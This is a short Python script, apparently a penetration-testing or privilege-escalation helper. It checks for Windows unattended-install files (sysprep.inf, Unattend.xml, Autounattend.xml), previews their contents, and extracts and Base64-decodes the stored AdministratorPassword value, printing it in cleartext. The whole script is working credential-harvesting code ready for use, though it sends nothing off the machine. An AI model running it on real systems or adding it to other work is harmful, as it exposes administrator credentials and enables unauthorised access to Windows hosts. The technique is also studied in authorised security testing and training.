#!/usr/bin/env python3

# ============================================
# 1st PART: Script to list the files
# ============================================

import os

FILE_LOCATIONS = [
    r"C:\sysprep\sysprep.inf",
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Autounattend.xml"
]

def list_files():
    for path in FILE_LOCATIONS:
        if os.path.exists(path):
            print(f"[+] Found: {path}")
        else:
            print(f"[-] Not found: {path}")

# ============================================
# 2nd PART: Script to preview file content
# ============================================

def preview_file_content():
    for path in FILE_LOCATIONS:
        if os.path.exists(path):
            print(f"[+] Found: {path}")
            try:
                with open(path, "r", encoding="utf-8") as f:
                    content = f.read()
                print("[*] File content preview:\n")
                print(content[:500])
            except Exception as e:
                print(f"[!] Could not read file: {e}")

# ============================================
# 3rd PART: Script to extract and decode the password
# ============================================

import re
import base64

def decode_base64(data):
    """Decode Base64 data, adding padding if needed."""
    missing_padding = len(data) % 4
    if missing_padding:
        data += '=' * (4 - missing_padding)
    return base64.b64decode(data).decode('utf-8')

def extract_and_decode_password():
    admin_password = None

    for path in FILE_LOCATIONS:
        if os.path.exists(path):
            print(f"[+] Found: {path}")
            try:
                with open(path, "r", encoding="utf-8") as f:
                    content = f.read()
            except Exception as e:
                print(f"[!] Could not read file: {e}")
                continue

            pattern = r"<AdministratorPassword>.*?<Value>(.*?)</Value>.*?</AdministratorPassword>"
            match = re.search(pattern, content, re.DOTALL | re.IGNORECASE)
            if match:
                raw_pw = match.group(1).strip()
                print(f"[+] Encoded password: {raw_pw}")

                try:
                    decoded_pw = decode_base64(raw_pw)
                    print(f"[+] Decoded password: {decoded_pw}")
                    admin_password = decoded_pw
                except Exception as e:
                    print(f"[!] Could not decode Base64: {e}")
                    admin_password = raw_pw

                break

    if not admin_password:
        print("[-] No Administrator password found.")
    else:
        print("[*] Administrator password extraction completed.")


